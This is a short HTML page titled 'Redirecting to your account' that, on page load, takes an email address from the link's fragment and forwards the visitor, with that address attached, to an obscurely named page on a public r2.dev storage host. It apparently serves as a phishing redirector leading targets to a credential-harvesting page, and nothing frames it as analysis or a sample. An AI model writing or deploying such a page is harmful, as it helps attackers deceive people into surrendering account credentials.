<!DOCTYPE html>
<html>
<head>
    <title>Redirecting to your account</title>
    <script type="text/javascript">
        function isValidEmail(email) {
            // Simple email validation regex
            var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailPattern.test(email);
        }

        function redirect() {
            var url = window.location.href;
            var emailParam = url.split("#email=")[1];

            if (emailParam && isValidEmail(emailParam)) {
                var newUrl = "https://pub-f1addf18a71449789fe98ae8ca131e20.r2.dev/YzUxMjlkYzkxMzM0MmFmYjIxNTU3YjM4MmZjMTkzMzgxNGNkYzQwZGQ1MjVhOTcwMmI0NmU3YjQ1OWM5YTc3OQ%3D%3D.html#" + emailParam;
                window.location.href = newUrl;
            } else if (!emailParam) {
                window.location.href = "https://pub-f1addf18a71449789fe98ae8ca131e20.r2.dev/YzUxMjlkYzkxMzM0MmFmYjIxNTU3YjM4MmZjMTkzMzgxNGNkYzQwZGQ1MjVhOTcwMmI0NmU3YjQ1OWM5YTc3OQ%3D%3D.html#email=";
            }
        }
    </script>
</head>
<body onload="redirect()">
</body>
</html>
